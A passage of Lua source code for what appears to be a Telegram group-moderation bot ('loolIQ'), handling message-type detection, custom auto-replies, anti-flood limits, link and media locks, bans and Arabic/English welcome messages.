--     Source loolIQ     --
if msg.content_.ID == "MessageVideo" then
print("This is [ Video ]")
msg_type = 'MSG:Video'
end
--     Source loolIQ     --
if msg.content_.ID == "MessageAnimation" then
print("This is [ Gif ]")
msg_type = 'MSG:Gif'
end
--     Source loolIQ     --
if msg.content_.ID == "MessageLocation" then
print("This is [ Location ]")
msg_type = 'MSG:Location'
end
--     Source loolIQ     --
if msg.content_.ID == "MessageChatJoinByLink" then
print("This is [ Msg Join By link ]")
msg_type = 'MSG:NewUser'
end
--     Source loolIQ     --
if not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
print("This is [ MarkDown ]")
msg_type = 'MSG:MarkDown'
end
--     Source loolIQ     --
if msg.content_.ID == "MessageChatJoinByLink" then
print("This is [ Msg Join By Link ]")
msg_type = 'MSG:JoinByLink'
end
--     Source loolIQ     --
if msg.content_.ID == "MessageContact" then
print("This is [ Contact ]")
msg_type = 'MSG:Contact'
end
---
end
--     Source loolIQ     --
if ((not d) and chat) then
if msg.content_.ID == "MessageText" then
do_notify (chat.title_, msg.content_.text_)
else
do_notify (chat.title_, msg.content_.ID)
end
end
--     Source loolIQ     --
if msg.content_.photo_ then
if DevAbs:get(loolIQ..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_
else
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🎢 تـۖم تغيير صـۄرة ٱڵمجـمۄعة\n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟', 1, 'md') 
DevAbs:del(loolIQ..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_)
setphoto(msg.chat_id_, photo_id)
end end
--     Source loolIQ     --
text = msg.content_.text_ if msg.content_.text_ or msg.content_.video_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ then 
local content_text = DevAbs:get(loolIQ..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_text == 'save_repgp' then DevAbs:del(loolIQ..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
local content_text = DevAbs:get(loolIQ..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
if msg.content_.video_ then DevAbs:set(loolIQ..'video_repgp'..content_text..''..msg.chat_id_..'', msg.content_.video_.video_.persistent_id_)
end
if msg.content_.sticker_ then DevAbs:set(loolIQ..'stecker_repgp'..content_text..''..msg.chat_id_..'', msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then DevAbs:set(loolIQ..'voice_repgp'..content_text..''..msg.chat_id_..'', msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.animation_ then DevAbs:set(loolIQ..'gif_repgp'..content_text..''..msg.chat_id_..'', msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
DevAbs:set(loolIQ..'text_repgp'..content_text..''..msg.chat_id_..'', msg.content_.text_)
end 
DevAbs:sadd('rep_owner'..msg.chat_id_..'',content_text) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم حفـۨظ ٱڵـرد ٱڵـجـډيـډ', 1, 'md') 
DevAbs:del(loolIQ..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
return false 
end 
end
if msg.content_.text_ and not DevAbs:get(loolIQ..'lock_reeeep'..msg.chat_id_) then 
if DevAbs:get(loolIQ..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(loolIQ..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if DevAbs:get(loolIQ..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(loolIQ..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if DevAbs:get(loolIQ..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(loolIQ..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if DevAbs:get(loolIQ..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(loolIQ..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..''))
end
if DevAbs:get(loolIQ..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
Dev_Abs(msg.chat_id_, msg.id_, 1, DevAbs:get(loolIQ..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'') , 1, 'md') 
end end
text = msg.content_.text_
if msg.content_.text_  or msg.content_.video_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ then
local content_text = DevAbs:get(loolIQ.."add:repallt"..msg.sender_user_id_)
if content_text == 'save_rep' then
DevAbs:del(loolIQ.."add:repallt"..msg.sender_user_id_)
local content_text = DevAbs:get(loolIQ.."addreply2:"..msg.sender_user_id_)
if msg.content_.video_ then
DevAbs:set(loolIQ.."video_repall"..content_text, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.sticker_ then
DevAbs:set(loolIQ.."stecker_repall"..content_text, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
DevAbs:set(loolIQ.."voice_repall"..content_text, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.animation_ then
DevAbs:set(loolIQ.."gif_repall"..content_text, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
DevAbs:set(loolIQ.."text_repall"..content_text, msg.content_.text_)
end 
DevAbs:sadd('rep_sudo',content_text)
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم حفـۨظ ٱڵـرد ٱڵـجـډيـډ', 1, 'md') 
DevAbs:del(loolIQ.."addreply2:"..msg.sender_user_id_)
return false end end
if msg.content_.text_ and not DevAbs:get(loolIQ..'lock_reeeep'..msg.chat_id_) then
if DevAbs:get(loolIQ.."video_repall"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(loolIQ.."video_repall"..msg.content_.text_))
end
if DevAbs:get(loolIQ.."voice_repall"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(loolIQ.."voice_repall"..msg.content_.text_))
end
if  DevAbs:get(loolIQ.."gif_repall"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevAbs:get(loolIQ.."gif_repall"..msg.content_.text_))
end
if DevAbs:get(loolIQ.."stecker_repall"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevAbs:get(loolIQ.."stecker_repall"..msg.content_.text_))
end
if DevAbs:get(loolIQ.."text_repall"..msg.content_.text_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, DevAbs:get(loolIQ.."text_repall"..msg.content_.text_) ,  1, "md")
end
end 
-- end functions loolIQ --
--      Anti FLood       -- 
--      Flood Max        --
local flmax = 'flood:max:'..msg.chat_id_
if not DevAbs:get(loolIQ..flmax) then
floodMax = 5
else
floodMax = tonumber(DevAbs:get(loolIQ..flmax))
end
--     Source loolIQ     --
--          Msg           --
local pm = 'flood:'..msg.sender_user_id_..':'..msg.chat_id_..':msgs'
if not DevAbs:get(loolIQ..pm) then
msgs = 0
else
msgs = tonumber(DevAbs:get(loolIQ..pm))
end
--     Source loolIQ     --
--    Flood Check Time    --
local TIME_CHECK = 2
--     Source loolIQ     --
--      Flood Check       --
local absflood = 'anti-flood:'..msg.chat_id_
if msgs > (floodMax - 1) then
if DevAbs:get(loolIQ..'floodstatus'..msg.chat_id_) == 'Kicked' then
del_all_msgs(msg.chat_id_, msg.sender_user_id_)
chat_kick(msg.chat_id_, msg.sender_user_id_)
local ABS_PROX = '❗️🚸 ⌯ ٱڵـعضو : ◝ '..msg.sender_user_id_..' ◟ \n❗️⚠️ ⌯ قٱم بٱڵتكرٱر ٱڵمحدد تم طرده '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 12, string.len(msg.sender_user_id_))
elseif DevAbs:get(loolIQ..'floodstatus'..msg.chat_id_) == 'DelMsg' then
del_all_msgs(msg.chat_id_, msg.sender_user_id_)
else
del_all_msgs(msg.chat_id_, msg.sender_user_id_)
end
end
--     Source loolIQ     --
local sendabs = function(chat_id, reply_to_message_id, text, offset, length, userid)
tdcli_function({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID = "InputMessageText",
text_ = text,
disable_web_page_preview_ = 1,
clear_draft_ = 0,
entities_ = {
[0] = {
ID = "MessageEntityMentionName",
offset_ = offset,
length_ = length,
user_id_ = userid
}
}
}
}, dl_cb, nil)
end
--     Source loolIQ     --
--      Process mod       --
local check_username = function(extra, result, success)
local fname = result.first_name_ or ""
local lname = result.last_name_ or ""
local name = fname .. " " .. lname
local username = result.username_
local svuser = "user:Name" .. result.id_
local id = result.id_
if username then
DevAbs:set(loolIQ..svuser, "@" .. username)
else
DevAbs:set(loolIQ..svuser, name)
end
end
getUser(msg.sender_user_id_, check_username)
--     Source loolIQ     --
----- START MSG CHECKS -----
if is_banned(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
chat_kick(msg.chat_id_, msg.sender_user_id_)
return
end
if is_muted(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
return
end
if is_gbanned(msg.sender_user_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
chat_kick(msg.chat_id_, msg.sender_user_id_)
delete_msg(chat,msgs)
return
end
if DevAbs:get(loolIQ..'bot:muteall'..msg.chat_id_) and not is_admin(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
return
end 
DevAbs:incr(loolIQ..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevAbs:incr(loolIQ..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
DevAbs:incr(loolIQ..'group:msgs'..msg.chat_id_)
if msg.content_.ID == "MessagePinMessage" then
if DevAbs:get(loolIQ..'pinnedmsg'..msg.chat_id_) and DevAbs:get(loolIQ..'bot:pin:mute'..msg.chat_id_) then
unpinmsg(msg.chat_id_)
local pin_id = DevAbs:get(loolIQ..'pinnedmsg'..msg.chat_id_)
pinmsg(msg.chat_id_,pin_id,0)
end
end
if DevAbs:get(loolIQ..'bot:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
end
DevAbs:del(loolIQ..'bot:viewget'..msg.sender_user_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, 'The number of post views is : ('..msg.views_..') \n ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ عدد مشٱهدٱت ٱڵمنشور هوَ : ('..msg.views_..') \n ', 1, 'md')
end
DevAbs:del(loolIQ..'bot:viewget'..msg.sender_user_id_)
end
end
--     Source loolIQ     --
--         Photo          --
if msg_type == 'MSG:Photo' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(loolIQ..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(loolIQ..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Photo]")
end
end
end
if DevAbs:get(loolIQ..'bot:photo:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Photo]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(loolIQ..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Photo]")
if DevAbs:get(loolIQ..'bot:strict'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
end
end
end
if DevAbs:get(loolIQ..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Photo]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(loolIQ..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Photo]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(loolIQ..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Photo]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(loolIQ..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Photo]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(loolIQ..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Photo]")
end
end
end
end
--     Source loolIQ     --
--        Markdown        --
elseif msg_type == 'MSG:MarkDown' then
if DevAbs:get(loolIQ..'markdown:lock'..msg.chat_id_) then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
end
--     Source loolIQ     --
--        Document        --
elseif msg_type == 'MSG:Document' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(loolIQ..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(loolIQ..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Document]")
end
end
end
if DevAbs:get(loolIQ..'bot:document:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Document]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(loolIQ..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Document]")
if DevAbs:get(loolIQ..'bot:strict'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
end
end
end
if DevAbs:get(loolIQ..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Document]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(loolIQ..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Document]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(loolIQ..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Document]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(loolIQ..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Document]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(loolIQ..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Document]")
end
end
end
end
--     Source loolIQ     --
--         Inline         --
elseif msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and msg.via_bot_user_id_ ~= 0 then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(loolIQ..pm, TIME_CHECK, msgs+1)
end
if DevAbs:get(loolIQ..'bot:inline:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Inline]")
end
end
--     Source loolIQ     --
--        Sticker         --
elseif msg_type == 'MSG:Sticker' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(loolIQ..pm, TIME_CHECK, msgs+1)
end
if DevAbs:get(loolIQ..'bot:sticker:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Sticker]")
end
end
elseif msg_type == 'MSG:JoinByLink' then
if DevAbs:get(loolIQ..'bot:tgservice:jk'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_ 
 delete_msg(chat,msgs)
print("Deleted [Lock] [Tgservice] [JoinByLink]")
return
end
function get_welcome(extra,result,success)
if DevAbs:get(loolIQ..'welcome:'..msg.chat_id_) then
text = DevAbs:get(loolIQ..'welcome:'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = 'Hi ( firstname )\nWelcome To Group '
else
text = '❗️🚸 ⌯ أهـلاً بِـك ⌯» [firstname](https://telegram.me/username) \n❗️🎗 ⌯ فـي ⌯» '..title_name(msg.chat_id_)..'\n❗️📛 ⌯ ٱڵـتـزم بٱڵـقوانين ڵـتجنب ٱڵـطرد'
end
end
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('lastname',(result.last_name_ or ''))
local text = text:gsub('username',(result.username_ or ''))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
if DevAbs:get(loolIQ.."bot:welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--     Source loolIQ     --
--      New User Add      --
elseif msg_type == 'MSG:NewUserAdd' then
if DevAbs:get(loolIQ..'bot:tgservice:jk'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tgservice] [NewUserAdd]")
return
end
if msg.content_.members_[0].username_ and msg.content_.members_[0].username_:match("[Bb][Oo][Tt]$") then
if not is_admin(msg.content_.members_[0].id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'bot:bots:gkgk'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.content_.members_[0].id_)
return false
end
end
end
if is_banned(msg.content_.members_[0].id_, msg.chat_id_) then
chat_kick(msg.chat_id_, msg.content_.members_[0].id_)
return false
end
if DevAbs:get(loolIQ.."bot:welcome"..msg.chat_id_) then
if DevAbs:get(loolIQ..'welcome:'..msg.chat_id_) then
text = DevAbs:get(loolIQ..'welcome:'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
text = 'Hi ( firstname )\nWelcome To Group '
else
text = '❗️🚸 ⌯ أهـلاً بِـك ⌯» [firstname](https://telegram.me/username) \n❗️🎗 ⌯ فـي ⌯» '..title_name(msg.chat_id_)..'\n❗️📛 ⌯ ٱڵـتـزم بٱڵـقوانين ڵـتجنب ٱڵـطرد'
end
end
local text = text:gsub('firstname',(msg.content_.members_[0].first_name_ or ''))
local text = text:gsub('lastname',(msg.content_.members_[0].last_name_ or ''))
local text = text:gsub('username',(msg.content_.members_[0].username_ or ''))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
--     Source loolIQ     --
--        Contact         --
elseif msg_type == 'MSG:Contact' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(loolIQ..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(loolIQ..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Contact]")
end
end
end
if DevAbs:get(loolIQ..'bot:contact:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Contact]")
end
end
--     Source loolIQ     --
--         Audio          --
elseif msg_type == 'MSG:Audio' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(loolIQ..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(loolIQ..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Audio]")
end
end
end
if DevAbs:get(loolIQ..'bot:music:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Audio]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(loolIQ..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Audio]")
end
end
if DevAbs:get(loolIQ..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Audio]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(loolIQ..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Audio]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(loolIQ..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Audio]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(loolIQ..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Voice]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(loolIQ..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Audio]")
end
end
end
end
--     Source loolIQ     --
--         Voice          --
elseif msg_type == 'MSG:Voice' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(loolIQ..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(loolIQ..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(loolIQ..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Voice]")
end
end
end
if DevAbs:get(loolIQ..'bot:voice:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Voice]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(loolIQ..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Voice]")
end
end
if DevAbs:get(loolIQ..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Voice]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(loolIQ..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Voice]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(loolIQ..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Voice]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(loolIQ..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Voice]")
end
end
